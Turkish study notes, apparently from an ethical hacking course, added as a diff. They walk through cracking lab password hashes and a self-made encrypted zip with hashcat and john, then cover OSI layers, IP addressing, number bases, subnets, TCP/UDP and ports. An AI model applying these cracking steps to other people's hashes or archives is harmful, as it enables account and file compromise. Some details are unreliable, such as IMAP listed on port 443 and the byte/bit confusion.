+ hashcat -m 500 mylinuxhash.txt /usr/share/wordlists/fasttrack.txt --potfile-disable çalıştırıyoruz (500 burada kıracağımız md5 ın kodu)
+exhausted yazıyor status kısmında yani bizim denediğimiz şifre fasttrack.txt nin içerisinde yok 
+(hash mi yok clear şifre mi yok önce hashleyip ondan sonram ı eşleştiriyor bunu araştır kırma işlemini nasıl yapıyor)
+
+daha sonra terminalde new tab açıp nano metasploitablepass.txt çalıştırıyoruz içinde 
+password
+gjdlfkjg
+fjgldkjg
+msfadmin  
+ctrl+o ardından ctrl+x yapıp çıkıyoruz 
+
+tekrar hashcat -m 500 mylinuxhash.txt /usr/share/wordlists/metasploitablepass.txt --potfile-disable
+ve kırdık approaching final keyspace satırının altında hash den sonra / karakterinden sonra şifremiz msfadmin olarak gösterilir 
+
+/Documents içerisindeyken şimdi de mywindowshash.txt yi kırmayı deneyelim ilgili dosyayı kaynaklardan /Document e indiriyoruz 
+
+ hashcat -m 1000 mylinuxhash.txt /usr/share/wordlists/rockyou.txt --potfile-disable (1000 = NTLM in kodu)
+ çalıştırıp biraz bekledikten sonra -çünkü rockyou.txt nin içerisinde binlerce şifre var- sonuç olarak şifremizin Passw0rd! olduğunu görürüz 
+
+ bu dersimizde şifreli ziplenmiş -arşivlenmiş- bir dosyayının şifresini kırmayı öğrenelim 
+
+ öncelikle windows makinemizde secret.txt isimli bir metin belgesi oluşturalım içine herhangi bir şey fkljghflkjh şeklinde bir şey yazıp 
+ kaydediyoruz winzip evaulation version u indirip kuralım daha sonra programı açalım sağ tarafta bir kilit emojosi yer alıyor yanında da
+  Encrypt (şifrele!) yazıyor bunu ON yapıyoruz tıklayıp -default da OFF olarak geliyor- tıkladığımızda gri olan switch maviye dönecek default da
+  switch in siyah ucu solda tıklayınca sağa kayıyor ve mavi oluyor daha sonra oluşturmuş olduğumuz bu secret.txt dosyasını sürükleyip 
+  bu programın içine bırakırsak ardından gelen mesaja OK diyoruz ve bizden bir şifre isteyecek şifremizi secret123 yapıyoruz ve artık dosyamız
+   şifrelendi daha sonra programın en üstündeki navbar da en başta file tab ına tıklayıp açılan seçeneklerden Save diyip dosyamızı kaydedersek 
+ artık bu arşivlenmiş dosyayı bir yere çıkartmak istediğimizde veya dosyanın içeriğini görüntülemek istediğimizde bize bir şifre soracaktır 
+ 192. dersin kaynaklar kısmındaki dosyayı kalimize indiriyoruz kalide terminalde mysecrep.zip i nerede indirdiysek oraya gidiyoruz 
+ -cd yazarak- daha sonra new tab den yeni bir terminalde apt-get install john çalıştırıyoruz bu tool pek çok şifreyi veya hashi kırmamızı 
+ sağlıyor ardından bir önceki -mysecret.zip in bulunduğu dizinde olduğumuz- terminalde zip2john mysecret.zip çalıştırıyoruz 
+ bu tool bu dosyanın içerisinden bir hash çıkartıyor (bu hash dosyanın gerçek şifresinin hash i mi yoksa dosyanın içeriğinin 
+ binary kodunun hash hali mi araştır) ancak biraz uzun bir hash veriyor biz tam olarak ihtiyacımız olan kısmı almamız gerekiyor bu hash içinden 
+ bizim ihtiyacımız olna kısım $zip2$ ile başlayan $ dan itibaren $ dahil : iki nokta üst üsteden hemen önceki $ a kadar ki olan kısım buranın
+  tamamını kopyalıyoruz biz burada zip2john mysecret.zip çalıştırdıktan sonra gelen çıktının sadece ilk satırındaki bahsettiğimiz kısmı 
+  kopyalayacağız diğer satırlarla işimiz yok hashini başarıyla aldıktan sonra 
+  hashcat -m 13600 myzip.txt /usr/share/wordlists/fasttrack.txt --potfile-disable çalıştırıyoruz burada yazdığımız 13600 winsip in hash kodu 
+ardından biraz bekledikten sonra bizim için şifremizi kıracaktır gelen çıktıda approaching final keyspace satırının hemen altındaki satırda 
+en son : (iki nokta üst üsteden sonra) :secret123 olarak bulunan şifremizi görebiliriz 
+
+bu dersimizde OSI modeli nedir onu öğrenelim OSI (Open System Interconnection) = Açık sistem arabağlantısı anlamına gelir 
+bu osi network teorisi 7 adet katmana ayrılır (layer=katman) örn:bu işlem layer 4 de oluyor cümlesi gibi 
+1. katmandan 7. katmana doğru içeriği daha büyüyerek giden daha gelişmiş işlemlerin daha karmaşık işlemlerin yapıldığı bir hiyerarşiye sahiptir 
+
+1. katman physical(fiziksel katman) örneğin veri kabloları gibi (data cables etc) internet bağlantısını veya cihazların birbirleri arasındaki 
+bağlantının sağlanması için gerekli olan fiziksel materyal olan kablo 
+2.katman olan data layer (veri katmanı) bu katmanda veri işleniyor switch cihazı bu katmandadır 
+(bu cihaz aynı ağ içerisindeki cihazların MAC adreslerini kullanarak iletişim kuran bir çok bilgisayarı tek bir ağa bağlamak için kullandığımız
+bir cihazdır [tam anlamadım bu işlemi nasıl yapıyor iyice araştır])
+3. network layer (ağ katmanı) bu katmanda router cihazı yer alıyor (bu cihaz farklı networkleri ve bu networklerdeki cihazların 
+arasında bir bağlantı oluşturmaya yarar bu bağlantıyı da ip adreslerini kullanarak yapar)
+4. transport layer (taşıma katmanı) verinin, datanın taşındığı katmandır bu katmanda da veri / data TCP, UDP gibi protokoller kullanarak taşınır 
+(farklı bir cihaza ulaştırılır/gönderilir/aktarılır)
+5. session layer (oturum katmanı) bu katmanda bir oturum açmak,bağlantı kurmak o bağlantının yönetimi ve (session managment) 
+ve iletişim (communication) işlemlerinin yapıldığı katmandır 
+6. katman olan presentation layer (sunum katmanı) artık verinin görselleştirildiği yer örneğin jpeg,mov,data 
+gibi verinin gözle görüntülendiği katmandır bu katmanı tam anlamadım iyice araştır 
+7. application layer (uygulama katmanı) bu katmanda da http,mail-server,etc gibi protokollerin ve servislerin kullanıldığı en geniş ve
+ son kullanıcıya en yakın olan katman olarak gösterebiliriz 
+
+bu dersimizde ip adreslerini detayıyla inceleyelim 
+
+örnek bir ip adresi olarak 192.168.0.1 
+
+genelde bir routerdan veya modemden bir ip aldığımızda bu 192 ile başlar 
+
+ip adresleri 8 bit ten oluşan bir gösterime sahiptir 1 ve 0 lar ile gösterilir 192.168.0.1 ip adresinin 
+binary (ikili / yani 0 ile 1 ile oluşturularak ifade edilmiş hali)
+
+11000000.10101000.00000000.00000001 bu gösterim 4 adet kısımdan ve her kısımda da 8 karakterden oluşan her karakterin yalnızca 1 veya 0 ı ifade 
+edebildiği bir gösterim olarak görüyoruz burada 192 nin binary gösterimi ilk kısımdaki değer 168 in ikinci kısım diye devam eder 
+her karakter 1byte = 1 bit değerindedir 
+
+bilgisayarlarımız bit ler ile çalışıyor bu bitler 1 veya 0 değerini alır high level language (yüksek seviye programlama dilleri)
+bu programlama dileri herkesin anlayabileceği (kotlin,java,python,swift) ancak bu programlama dilleri bilgisayarda çalıştığı esnada 
+Assembly denien bir ara forma dönüştürülür özellikle exe dosyalarında mobil uygulamalarda da bu geçerli ios de buna dahil 
+daha sonra bu ara katmanda dönüştürülen assembly kodu da machine language e yani makine diline makinanın anlayabileceği bir dile 
+(1 ve 0 lara dönüştürülür) 
+
+ancak biz tabii ki son kullanıcı olarak bunları görmüyoruz bunlar arkaplanda oluyor 
+
+örneğin javadaki A=B+C işlemi Assembly programlama dilinde ADD (R2,R3,R4) şeklinde yazılır yani R2 R3 VE R4 ü topla R2 ismindeki bir register a yaz 
+
+binary (ikili) sistem, hexedecimal (16) sistem ve günlük hayatta kullandığımız decimal (onluk) sistem aynı şekilde çalışır 
+
+215 decimal(onluk) sistemde şu şekilde yazılır = 5 * 10^0 (5 çarpı 10 üzeri 0 yani 5 çarpı 1 [bir sayının o ıncı kuvveti(üssü) 1 e eşittir])
+ + 1 * 10^1 yani = 10 + 2 * 10^2 yani 200 toplamda 200 + 10 + 5 = 215 bulunur en sağdaki rakam 10^0 dan başlayarak sola doğru ^1, ^2 şeklinde 
+ ilk rakama kadar gider ve her basamakta bu üslü ifade basamaktaki ilgili sayıyla çarpılır ve sonuçta çarpılan bütün bu sayılar kendi aralarında
+  toplanarak sonuç elde edilir 
+
+ binary (ikili) sistem de bu mantıkla çalışır ancak decimal sistemde 10^x olmasının sebebi 10luk sistem olduğu için binary de de bu 2^x şeklinde gerçekleşir 
+ örneğin 101 binary sinin yazılış şekli = 1 * 2^0 = 1 + 0 * 2^1 = 0 ve 1 * 2^2 ün toplamıdır yani 5 tir 
+
+ HEXADECIMAL sistem de aynı mantıkla ilerler ama burada harfler de devreye girer şöyle ki ; 
+
+ 0 1 2 3 4 5 6 7 8 9 A (10) B (11) C (12) D (13) E (14) F (15) 
+
+ Örneğin A4F6 şeklinde yazılan bir hexedecımal ın yazılışı 6 * 16^0 + 15 * 16^1 + 4 * 16^2 + 10 * 16^3 şeklinde olacaktır 
+
+ 42.230
+
+ bir ip adresinin boyutu 4 byte dır / 4 adet 8 bit lik veri kümelerinden oluşur her 8 bit = 1 bytedır 32 bit = 4 byte yapar 
+
+ ip adresi binary olarak 11000000.10101000.00000000.00000001 bu şekilde yazılır 
+
+ kali terminalde ifconfig çalıştırdığımızda gelen çıktıda inet satırındaki değer aslında bizim ipv4 (version 4 ip adresi)mizdir 
+
+  bir de version =ipv6 vardır ikisinin farkı şuradan kaynaklanmaktadır ipv4 de bütün matematiksel olasılıkları dahil ettiğimizde toplamda 
+  2^32 adet = 3.5 milyar civarı farklı ip adresi demek ancak bu artık mevcut koşullarda yeterli gelmiyor çünkü çok daha fazla insan var 
+  dünyada ve her geçen gün internete bağlanan cihaz sayısı artıyor bunun için ipv6 geliştirildi burada da 2^128 adet farklı ip üretilebiliyor 
+
+peki şuan halihazırda 3 milyardan daha fazla ip ye sahip internete bağlı cihaz varsa bunlar nasıl internete bağlı kalmaya devam edebiliyor 
+bunun sebebi NAT (Network Adress Translation) Network Address Translation, TCP/IP ağındaki bir bilgisayarın yönlendirme cihazı ile 
+başka bir ağa çıkarken adres uzayındaki bir IP ile yeniden haritalandırma yaparak IP paket başlığındaki ağ adres bilgisini değiştirme sürecidir. 
+
+burada özetle bir ip adresinin farklı farklı gösterim şekilleri mevcuttur Class A, B, C   Ve Loopback (local) gösterimler şeklinde 
+network mask (subnet de denilir) alt ağ diye çevirebiliriz örneğin 10.0.0.0 ip adresinin network mask ı 255.0.0.0 şeklindedir burada 
+255 koyduğumuz yerleri blockluyoruz bu kısım da ip de 10 kısmına denk gelir blockluyoruz derken burası artık değişemez olarak ayarlıyoruz 
+geri kalan 0.0.0 kendi içerisinde değişebilir ama baştaki 10 kısmı hep sabit kalacak yine farklı gösterilerde subnet kısmında nerede 
+255. varsa o unit ip adresine denk geldiği yer blocklanır 
+
+bir bloğun (kısmın/nokta ile ayrılan her bir bölümün) alabileceği en yüksek değer 255 dir 
+her bir blokta toplam 256 farklı sayı girilebilir 0-255 arasında her iki sayı da dahil edildiğinde toplam 256 adet sayı olduğundan dolayı 
+örneğin 192.168.0.0 ın sunbet mask i 255.255.255.0 dır ancak sondaki blokta 254 adet kullanılabilir değer vardır çünkü bu değerlerden 1 değeri 
+modeme(gateway) gidiyor/modem kullanıyor 255. değer de broadcast yayını için kullanılıyor (arp işleminde) bu 2 si çıkarıldığında da kullanılabilir 
+254 değer kalır 
+
+bir ev ağında subnet genelde 255.255.255.0 olur çünkü ev ağlarında genelde 254 den fazla cihaz bulunmaz ama şirket ağlarında veya 
+daha büyük ağlarda daha farklı subnet maskler tercih edilir 
+
+TCP daha çok reliability (güvenilirlik) dediğimiz verinin düzgün bir şekilde aktarıldığından emin olan yollarla işlem yapmamız gerektiğinde
+kullandığımız protokoldür TCP: UDP 'den daha yavaştır, çünkü verinin karşı tarafa ulaşıp ulaşmadığını kontrol eder.
+UDP: Ses ve video gönderiminde kullanılır. TCP'ye göre daha hızlıdır fakat güvenli değildir.
+UDP ise hıza ihtiyaç duyduğumuzda veriyi hızlı bir şekilde direkt iletmek istediğimizde bize yardımcı olur tcp ile yaptığımız işlemler 
+daha çok bir web sitesini ziyaret etme mail alma-verme , bir bağlantı açma konularında kullandığımız bir protokolken 
+UDP video aktarma video yayını yapma gibi hız gerektiren işlemlerde kullanırız burada syn, syn-ack ve ack dediğimiz 3 adet terim var 
+bunlar aslında tcp nin iletişim kurma aşamalarıdır 3 yollu el-sıkışma işlemidir (three way handshake) tcp ile bağlantı kurmak isteyen cihaz 
+bağlantı kurmak istediği cihaza syn paketi yollar(selam vermiş olut(3 yollu el sıkışma metaforundan dolayı)) syn paketini alan cihaz 
+syn-ack ile bu selamı alır ve tekrar ack paketi acknowledge/alındı gönderir syn mesajını alan cihaz 
+(en son ack gönderilir mi bundan emin değilim yoksa sadece syn ve syn-ack mi gönderilir bunu araştır)
+ 
+ TCP protokolünün kullanıldığı bazı hizmetler ve hangi port numaralarından gerçekleştiğine bakalım;
+ FTP (21) SSH(22), Telnet(23), SMTP(25), HTTP[BİR WEB SİTESİNE YAPTIĞIMIZ İSTEKLER(80), HTTPS(443), POP3(110), IMAP(443)
+
+ udp protokolünün kullanıldığı bazı hizmetler ve hangi port numaralarından gerçekleştiğine bakalım;
+
+ DHCP(67), SNMP (161)
+
+ dhcp KENDİ CİHAZLARIMIZDA İP ADRESİ ATAMALARININ YAPILDIĞI PORT 67 dir bu atama işleminin/protokolünün adı dhcp dir 
+
+ 3 yollu el sıkışma işlemini gözlemlemek için kalimize gelip wireshark ı açıyoruz terminalde wireshark çalıştırarak 
+ daha sonra udemy.com a gidip bir kaç saniye bekledikten sonra wireshark daki sol üstteki kırmızı kareden paket alıımını durduralım 
+ en üstteki navigation bar ın altındaki filtreleme inputuna tcp yazarak filtreliyoruz 
+
+255.255.255.255 subnet mask e sahip bir cihazın CIDR gösterimi /32 dir - Sınıfsız Alanlar Arası Yönlendirme (Classless Inter Domain Routing)
+bu adresin binary gösterimi 111111.111111.111111.111111 dır bu subnette kuulanılabilen adres sayısı 1 dir 
+
+1802. satırda kaldım
+
+
+
+
+
+
+
+
+
